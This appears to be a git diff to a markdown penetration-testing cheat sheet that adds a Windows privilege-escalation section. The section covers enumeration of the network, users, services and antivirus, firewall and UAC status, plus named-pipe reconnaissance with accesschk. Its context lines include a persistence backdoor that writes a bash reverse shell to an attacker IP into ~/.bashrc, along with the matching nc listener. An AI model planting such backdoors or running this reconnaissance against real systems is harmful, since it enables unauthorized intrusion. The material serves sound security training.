@@ -393,7 +393,135 @@ chsh -l <username> #modif default shell
 echo 'bash -i >& /dev/tcp/<IP>/<port> >&1' >> ~/.bashrc #payload backdoor
 nc -lvnp <port> #on your machine who want connect
 ```
-### 5. escalation privilege WINDOWS
+## Global RoadMap to Pentest _For Windows_
+### Windows PrivEsca
+#### Global enumeration
+Once in a Windows session, you need to perform a global enumeration like on Linux.  
+
+- Network enumeration
+- User and group info
+- Environment variables and running processes
+- Available commands
+
+```Powershell
+# Network interfaces and IPs
+ipconfig /all
+Get-NetIPConfiguration
+
+# Active connections
+netstat -ano
+Get-NetTCPConnection
+
+# Routing table
+route print
+Get-NetRoute
+
+# Network shares
+net share
+Get-SmbShare
+
+# Local network discovery
+arp -a
+Get-NetNeighbor
+```
+
+```Powershell
+# Current user
+whoami
+whoami /all
+whoami /priv
+
+# All local users
+net user
+Get-LocalUser
+
+# Local groups
+net localgroup
+Get-LocalGroup
+
+# Group members
+net localgroup administrators
+Get-LocalGroupMember -Group "Administrators"
+
+# Active sessions
+query user
+qwinsta
+```
+
+```Powershell
+# Environment variables
+set
+Get-ChildItem Env:
+$env:PATH
+
+# Running processes
+tasklist /v
+Get-Process
+
+# Services
+sc query
+Get-Service
+
+# Scheduled tasks
+schtasks /query /fo LIST /v
+Get-ScheduledTask
+```
+
+
+```Powershell
+# Antivirus/EDR
+wmic /namespace:\\root\securitycenter2 path antivirusproduct
+Get-MpComputerStatus
+
+# Windows Defender
+Get-MpPreference
+sc query windefend
+
+# Firewall
+netsh advfirewall show allprofiles
+Get-NetFirewallProfile
+
+# UAC status
+reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA
+```
+
+#### Named Pipes
+A temporary communication channel stored in memory that allows data exchange between processes.  
+Examples:  
+Database <--> Application  
+Windows Services <--> User Interface  
+We can monitor these Named Pipes to intercept requests or redirect communications.  
+Example:  
+```bash
+→ REQUEST: TDS Packet
+  Type: SQL_BATCH (0x01)
+  Query: "SELECT * FROM Users WHERE ID = 1"
+  Length: 35 bytes
+
+← RESPONSE: TDS Packet
+  Type: TABULAR_RESULT (0x81)
+  Columns: ID, Name, Email
+  Rows: [1, "John Doe", "john@example.com"]
+```
+```bash
+→ REQUEST: (Beacon vers PostEx)
+  Command: "whoami"
+  Task_ID: 12345
+  
+← RESPONSE:
+  Output: "DESKTOP-ABC123\john"
+  Task_ID: 12345
+  Status: SUCCESS
+```
+
+```Powershell
+get-childitem \\.\pipe\
+Get-Acl "\pipe\SQLLocal\SQLEXPRESS01" | Format-List
+set-location C:\Tools\Accesschk\
+.\accesschk.exe -accepteula -w \pipe\SQLLocal\SQLEXPRESS01 -v
+```
+
+### Active directory
 
 ## Attacking WI-FI _(WPS,WPA,WPA2)_
 ### Scan Network
